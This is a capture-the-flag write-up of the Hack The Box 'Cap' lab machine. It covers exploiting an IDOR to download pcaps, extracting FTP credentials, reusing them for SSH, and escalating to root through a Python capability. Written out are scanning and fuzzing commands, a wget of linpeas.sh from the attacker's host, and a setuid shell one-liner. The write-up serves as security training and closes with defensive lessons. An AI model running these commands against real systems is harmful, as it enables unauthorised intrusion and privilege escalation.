# HTB Cap Machine Writeup


<img width="480" height="274" alt="image" src="https://github.com/user-attachments/assets/cd0e62fe-d4c6-4dff-abdb-43d8e0b5f0e9" />

## Machine Information
- **Target IP**: 10.10.10.245
- **Operating System**: Linux
- **Difficulty**: Easy
- **Attack Vector**: IDOR + Capability Privilege Escalation

## Executive Summary

This writeup documents the exploitation of the HTB Cap machine, which featured an IDOR vulnerability in a network monitoring dashboard and a capability-based privilege escalation. The attack path involved discovering exposed network captures through directory fuzzing, analyzing FTP traffic to extract credentials, gaining SSH access, and exploiting Python capabilities to achieve root privileges.

## Reconnaissance

### Port Scanning

Initial reconnaissance was performed using Nmap to identify open services:

```bash
sudo nmap -sS --open -p- --min-rate 5000 10.10.10.245 -oG ./nmap/allports
```

![Port Scan Results](images/Pasted%20image%2020250824193714.png)

**Open Ports Discovered**:
- Port 21 (FTP)
- Port 22 (SSH) 
- Port 80 (HTTP)

### Service Analysis

**FTP Service**: Anonymous login attempts were unsuccessful.
**Web Service**: Accessed port 80 and discovered a network monitoring dashboard.

## Web Application Analysis

### Initial Discovery

The web application presented a network monitoring dashboard:

![Web Dashboard](images/Pasted%20image%2020250824202048.png)

### Directory Discovery

Web enumeration revealed a `/data/` directory containing network capture snapshots from previous scans.

### IDOR Vulnerability Exploitation

An IDOR vulnerability was identified allowing access to other users' network captures. Directory fuzzing was performed to enumerate available snapshots:

```bash
wfuzz -u http://10.10.10.245/data/FUZZ -z range,0-100 --hc 404,302
```

![IDOR Discovery](images/Pasted%20image%2020250824202734.png)

Multiple historical snapshots were discovered and could be downloaded for analysis.

## Credential Discovery

### Network Traffic Analysis

The most significant finding was in the `0.pcap` capture file, which contained FTP traffic from user Nathan. Since FTP traffic is unencrypted, credential extraction was possible through packet analysis.

![FTP Traffic Analysis](images/Pasted%20image%2020250824203004.png)

**Credentials Extracted**:
- **Username**: nathan
- **Password**: Buck3tH4TF0RM3!

## Initial Access

### FTP Access

Using the discovered credentials, FTP access was established:

![FTP Login](images/Pasted%20image%2020250824203548.png)

The user flag was discovered in the FTP directory, but limited functionality prompted attempts at SSH access.

### SSH Access

The same credentials successfully provided SSH access to the system:

![SSH Access](images/Pasted%20image%2020250824203746.png)

SSH access provided a more comfortable environment for privilege escalation activities.

## Privilege Escalation

### System Enumeration

The `linpeas.sh` enumeration script was transferred to the target system for comprehensive analysis:

```bash
wget http://10.10.14.9/linpeas.sh
```

![Linpeas Transfer](images/Pasted%20image%2020250824204221.png)

### Capability Discovery

Linpeas identified an interesting capability on the Python 3.8 binary:

![Python Capability](images/Pasted%20image%2020250824205113.png)

**Critical Finding**: `/usr/bin/python3.8` has special capabilities that can be exploited for privilege escalation.

### GTFOBins Research

Research on GTFOBins (https://gtfobins.github.io/gtfobins/python/) revealed the privilege escalation technique for Python capabilities:

```bash
./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

### Root Access Achievement

Executing the capability exploit successfully granted root privileges:

![Root Access](images/Pasted%20image%2020250824205958.png)

**Result**: Root flag obtained and machine fully compromised.

## Technical Analysis

### Vulnerability Chain

The successful compromise involved multiple vulnerabilities:

1. **IDOR Vulnerability**: Unauthorized access to other users' network captures
2. **Information Disclosure**: Unencrypted FTP credentials in network captures  
3. **Credential Reuse**: Same credentials used across multiple services
4. **Misconfigured Capabilities**: Python binary with dangerous capabilities

### Attack Vector Summary

1. **Web Reconnaissance** → Discovery of monitoring dashboard
2. **IDOR Exploitation** → Access to historical network captures
3. **Traffic Analysis** → FTP credential extraction from pcap files
4. **Lateral Movement** → SSH access with discovered credentials
5. **Privilege Escalation** → Python capability exploitation

## Key Lessons

1. **IDOR Impact**: Directory traversal vulnerabilities can expose sensitive data
2. **Traffic Analysis**: Unencrypted protocols reveal sensitive information
3. **Credential Security**: Avoid credential reuse across services
4. **Capability Management**: Carefully configure file capabilities to prevent abuse
5. **Network Monitoring**: Proper access controls needed for capture storage

## Conclusion

The HTB Cap machine demonstrated a realistic attack scenario combining web vulnerabilities with system misconfigurations. The IDOR vulnerability provided initial access to sensitive network data, while capability misconfiguration enabled privilege escalation. This exercise highlighted the importance of proper access controls and secure system configuration practices.
